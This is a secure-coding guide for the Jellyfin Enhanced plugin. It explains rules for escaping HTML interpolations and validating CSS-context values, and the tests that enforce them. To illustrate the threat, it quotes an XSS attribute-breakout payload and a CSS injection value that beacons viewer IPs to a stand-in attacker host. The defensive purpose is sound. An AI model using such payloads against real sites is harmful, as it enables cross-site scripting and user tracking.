# Client Security Rules

Jellyfin Enhanced builds a lot of UI as HTML strings — cards, modals, panels, toasts — and much of what those strings interpolate comes from places an attacker can influence: Jellyfin item fields, Seerr/TMDB payloads, *arr metadata, user names, search queries, error messages. Every one of those interpolations is a potential XSS sink. Rule X1 below is the escaping doctrine that closed that class of bug across the tree; like the [performance rules](performance-rules.md), it is **enforceable in review** — and, unlike them, it is also **enforced by a test** that fails the build on any unrecognized interpolation.

Non-obvious escape sites are marked in the source with `// SEC(X1):` comments:

```bash
grep -rn "SEC(X1" Jellyfin.Plugin.JellyfinEnhanced/src/
```

| # | Rule | One line |
|---|------|----------|
| X1 | Escape at the interpolation | Every `${...}` that lands in HTML is a compile-time constant / trusted producer, a coerced number, or wrapped in `escapeHtml(...)` — in attribute **and** text positions. Enforced by `escape-guard.test.ts`. |
| X2 | Sanitize CSS-context values | Every config/user-derived value entering a `style="..."` attribute, a stylesheet rule, `insertRule`, `color-mix()` or a CSS `var()` is validated — colours through `cssColorOr(...)` / `isCssColor(...)`. `escapeHtml` does **not** neutralize a CSS payload. Enforced by `css-injection-guard.test.ts`. |

---

## X1 — Escape at the interpolation

**Rule.** Classify every template-literal interpolation that becomes HTML (`innerHTML`, `innerHTML +=`, `insertAdjacentHTML`, `toast(...)`, or a string returned into any of those) into exactly one of three classes:

- **(a) Compile-time constant / trusted producer** — string literals, `UPPER_CASE` SVG/icon constants, the `icons` tables, `JE.icon(...)`, `assetUrl()`/`flagSvgUrl()`/`flagPngUrl()`/`themeCssUrl()`, `encodeURIComponent()`/`encodeURI()`, `JE.themer.getThemeVariables()` values, and local builder functions whose own returns pass this rule. Raw interpolation is OK — escaping plugin-owned SVG would break it.
- **(b) Numeric** — coerce at the interpolation: `${Number(x) || 0}` (style/attribute contexts especially), or provably-numeric expressions (`Math.*`, `.toFixed(...)`, `.length`, arithmetic).
- **(c) Item/API/user-derived** — **everything else**: wrap in `escapeHtml(...)` (`JE.escapeHtml` / `core/ui-kit`). In **both** attribute and text positions — `title="${escapeHtml(x)}"` *and* `<span>${escapeHtml(x)}</span>`. When in doubt, a value is class (c).

**Why.** `escapeHtml` rewrites `& < > " '`, so an escaped value cannot open a tag or break out of a double-quoted attribute — `'"><img src=x onerror=...>'` renders as inert text. Escaping *at the interpolation* (not at some upstream boundary) keeps the proof local: a reviewer — and the guard test — can look at one line and know it is safe. Numeric coercion is the same idea for style/attribute contexts where `escapeHtml` would still let hostile non-numeric strings through (`width:${x}px`).

**The pattern to copy:**

```ts
import { escapeHtml } from '../core/ui-kit'; // or JE.escapeHtml

el.innerHTML = `
    <div class="card" data-id="${escapeHtml(item.Id)}" title="${escapeHtml(item.Name)}">
        <img src="${escapeHtml(item.PosterUrl)}" style="width:${Number(item.Width) || 0}px">
        <span>${escapeHtml(item.Overview)}</span>
        ${ICON_SVG}${icons.request}${JE.icon!(JE.IconName!.STAR)}
        <ul>${items.map((i) => `<li>${escapeHtml(i.name)}</li>`).join('')}</ul>
    </div>`;
```

### The toast()/JE.t() trap

`toast()` renders its argument via `innerHTML`, and **`JE.t()` does NOT escape its params** — it substitutes them into the translation verbatim. A dynamic value passed through `t()` into `toast()` is an XSS sink that *looks* localized and harmless:

```ts
// WRONG — subtitleName is media metadata; t() passes it through raw,
// toast() assigns it to innerHTML:
toast(JE.t!('toast_subtitle', { subtitle: subtitleName }));

// RIGHT — escape at the call site:
toast(JE.t!('toast_subtitle', { subtitle: JE.escapeHtml(subtitleName) }));
```

The same applies to every `tWithFallback(...)` helper and to error toasts — server/API error text (`error.responseJSON?.message`, `e?.statusText`) is class (c) like anything else.

### Pre-escaping producers — do NOT double-escape

Two producers escape their **whole input first** and then add markup; their output is trusted HTML and wrapping it in `escapeHtml` again would render entity garbage:

- `parseMarkdown(...)` — `src/elsewhere/reviews.ts` (TMDB review bodies)
- `markdownToHtml(...)` — `src/enhanced/settings-panel/release-notes.ts` (GitHub release notes)

Pass them raw text, interpolate their result raw. If you add a producer like these, it must escape its input up front the same way (and be added to the guard's `PRE_ESCAPING_PRODUCERS` list). Their bodies are **no longer trusted by name alone**: the guard now verifies each pre-escaping producer escapes its whole first parameter before building any markup and never re-touches the raw parameter afterwards, so a reordered escape or a raw `${param}` slipped into the produced HTML fails the build.

### URL fields

URL-ish values from item/API data (`posterUrl`, `href` targets, image `src`) use `escapeHtml(...)` like any other class-(c) value — that is the convention today, and it neutralizes attribute breakout. What it does **not** do is validate the URL itself (`javascript:` schemes in an `href` survive escaping). Scheme/shape validation is tracked as future work; the model to copy already exists in the tree:

- **`isSafePosterPath`** (`src/jellyseerr/ui/cards.ts`) — validates a TMDB poster path against the exact shape TMDB returns (`/name.jpg`) before it enters a CSS `url('...')` context, with a local-asset fallback otherwise. The guard test recognizes `isSafe*(x) ? ...x... : fallback` and treats the validated value as safe in the true branch.
- **`isCssColor` / `cssColorOr`** (`src/core/css-safe.ts`) — the same idea for CSS color values entering a style attribute or stylesheet rule; see [X2](#x2-sanitize-css-context-values).

New user-influenced URLs in `href`/`src` positions should prefer a validator of this shape over bare `escapeHtml`.

### The splash-screen exception

`src/bootstrap/splashscreen.ts` is compiled to its own out-of-band IIFE that runs **before** the main bundle, so it cannot import `core/ui-kit`. It carries a local copy of `escapeHtml` as an inline `.replace(...)` chain for the admin-configured splash image URL. That is the **only** sanctioned copy — everything inside the bundle imports the one `escapeHtml` from `core/ui-kit`. (The guard recognizes the inline chain by its shape, so the exception is verified, not just tolerated.)

**Enforced.** `src/test/escape-guard.test.ts` parses every shipped `src/**/*.ts` file with the TypeScript compiler API on each `npm run test:client` and classifies **every interpolation in every HTML-bearing template literal**, plus the arguments of `toast(...)`, `insertAdjacentHTML(...)`, `innerHTML`/`outerHTML` assignments and HTML string concatenation. An interpolation that is not recognizably one of the three classes fails the build with its `file:line` and expression text. It resolves local `const`/`let` values, tracks builder functions across files (a builder that interpolates a bare parameter raw obligates *every call site* to pass a safe value), understands `.map(...).join(...)` over constant tables, validator guards, and the producers above. Genuinely-safe-but-unprovable expressions live in a small justified allowlist **inside the test file**; a stale entry fails a companion test, so the list cannot rot. If the guard fails on your code, fix it in this order: `escapeHtml(...)` → `Number(x) || 0` → route through a recognized producer → (last resort, with justification) allowlist.

The guard's justified allowlist is **line-pinned** — each entry names the exact `file:line` it covers and must match exactly one finding there, so an entry can never silently blanket a *new* interpolation added elsewhere in the same file.

**In the tree:** `src/core/ui-kit.ts` (`escapeHtml`, `toast`), `src/arr/requests/render-cards.ts` + `src/jellyseerr/more-info-modal/render.ts` (escaped card/modal builders with hostile-payload unit tests alongside), `src/jellyseerr/ui/cards.ts` (`isSafePosterPath`), `src/bootstrap/splashscreen.ts` (the sanctioned local escaper), `src/test/escape-guard.test.ts` (the guard).

---

## X2 — Sanitize CSS-context values

**Rule.** A config- or user-derived value that flows into a **CSS context** — a `style="..."` attribute, a stylesheet rule, `CSSStyleSheet.insertRule`, `color-mix()`, or a CSS custom property (`var()`/`--x:`) — must be validated, not merely HTML-escaped. Colours go through **`cssColorOr(value, fallback)`** / **`isCssColor(value)`** from `src/core/css-safe.ts`.

**Why.** `escapeHtml` rewrites HTML metacharacters, but none of `& < > " '` are needed to weaponize a CSS value: `red;background-image:url(https://attacker/beacon)` contains none of them and would sail through `escapeHtml` unchanged, exfiltrating every viewer's IP to the attacker's host and breaking out of the intended declaration. `isCssColor` asks the browser (`CSS.supports`) whether the string is a valid `<color>` and rejects anything else; `cssColorOr` substitutes a safe fallback so a hostile or malformed admin value degrades to a default instead of injecting.

**The pattern to copy:**

```ts
import { cssColorOr } from '../core/css-safe';

// admin-configured accent colour entering a stylesheet rule
sheet.insertRule(`.je-chip { background: ${cssColorOr(cfg.accent, 'var(--je-accent)')} }`);
```

**Enforced.** `src/test/css-injection-guard.test.ts` scans the source for config/user-derived values reaching CSS sinks and fails the build on an unvalidated one. Related hardening lands in the same pass: the subtitle-style pipeline now dirty-checks its inputs so a config change can't re-inject a stale style string.

**In the tree:** `src/core/css-safe.ts` (`isCssColor`, `cssColorOr`), `src/enhanced/subtitles.ts`, `src/enhanced/settings-panel/template.ts`, `src/enhanced/hidden-content-page/admin.ts` + `render.ts`, `src/test/css-injection-guard.test.ts` (the guard).

---

## Surfacing errors, not swallowing them

A security-adjacent correctness rule: a data fetch that fails must **show the failure**, never silently render an empty state that looks like "no results". `src/core/fetch-error.ts` classifies a rejected fetch (`describeFetchError` for a short sanitized message, `isStructuredServerError` to tell a real backend error from a genuinely-empty result), and `src/test/error-as-empty-guard.test.ts` fails the build when a `catch` renders an empty state instead of an error state. Server/API error text is treated as untrusted (class (c)) and escaped like any other value before it reaches a toast or panel.

## Modals and global shortcuts

JE's custom overlays go through `src/core/modal-a11y.ts` (`installModalA11y`), which gives an overlay proper dialog semantics, a Tab focus-trap, Escape handling and focus capture/restore — and, via a shared open-modal counter and the `je-modal-open` body class, **suppresses the global keyboard-shortcut listener while any modal is open**, so typing in a modal can't fire a plugin shortcut behind it.
